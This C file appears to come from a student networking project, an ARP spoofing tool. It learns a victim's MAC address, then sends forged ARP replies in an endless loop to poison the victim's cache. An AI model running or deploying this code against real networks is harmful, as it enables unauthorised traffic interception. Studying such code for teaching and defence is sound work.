/*
** EPITECH PROJECT, 2019
** arp_spoof
** File description:
** Spoof the target with spoofed packets
*/

#include <stdbool.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include "utils.h"
#include "arp.h"
#include "packet.h"

bool send_broadcast_packet(arp_t *arp)
{
    packet_t *packet = packet_init();
    uint8_t broadcast_addr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    if (packet == NULL)
        return (false);
    packet_configure_ethernet(packet, arp->src_mac_address, broadcast_addr);
    packet_configure_arp(packet, 1, broadcast_addr, arp);
    packet_send(arp->fd, packet, (struct sockaddr *)arp->address, \
                sizeof(*arp->address));
    return (true);
}

bool send_spoofed_packets(arp_t *arp, uint8_t *sender_mac)
{
    packet_t *spoofed_packet = packet_init();

    if (spoofed_packet == NULL)
        return (false);
    packet_configure_ethernet(spoofed_packet, arp->src_mac_address, sender_mac);
    packet_configure_arp(spoofed_packet, 2, sender_mac, arp);
    while (1) {
        packet_send(arp->fd, spoofed_packet, (struct sockaddr *)arp->address, \
                    sizeof(*arp->address));
        printf("Spoofed packet sent to '");
        print_ip_address(spoofed_packet->content.arp.sender_ip);
        printf("'\n");
        sleep(1);
    }
    return (true);
}

bool arp_spoof(arp_t *arp)
{
    packet_t *packet_received = NULL;

    if (send_broadcast_packet(arp) == false)
        return (false);
    packet_received = packet_receive(arp->fd, arp->args->dest_ip);
    if (packet_received == NULL)
        return (false);
    printf("Found victim's MAC address: '");
    memset(arp->src_mac_address, 0, IP_ADDRESS_LENGTH);
    memcpy(arp->src_mac_address, packet_received->content.arp.sender_mac, \
            IP_ADDRESS_LENGTH);
    print_mac_address(packet_received->content.arp.sender_mac);
    printf("'\n");
    if (send_spoofed_packets(arp, \
        packet_received->content.arp.sender_mac) == false)
        return (false);
    return (true);
}